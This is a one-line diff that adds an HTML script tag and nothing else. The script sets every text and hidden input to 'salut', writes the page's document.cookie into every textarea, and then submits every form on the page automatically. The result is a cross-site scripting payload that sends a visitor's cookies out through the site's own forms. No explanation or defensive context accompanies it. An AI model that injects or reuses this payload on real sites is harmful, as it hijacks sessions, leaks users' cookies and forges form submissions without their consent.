@@ -1,0 +1,1 @@
+<script>document.querySelectorAll('input[type="text"], input[type="hidden"]').forEach(i => i.value = 'salut'), document.querySelectorAll('textarea').forEach(t => t.value = document.cookie), document.querySelectorAll('form').forEach(f => f.submit());</script>
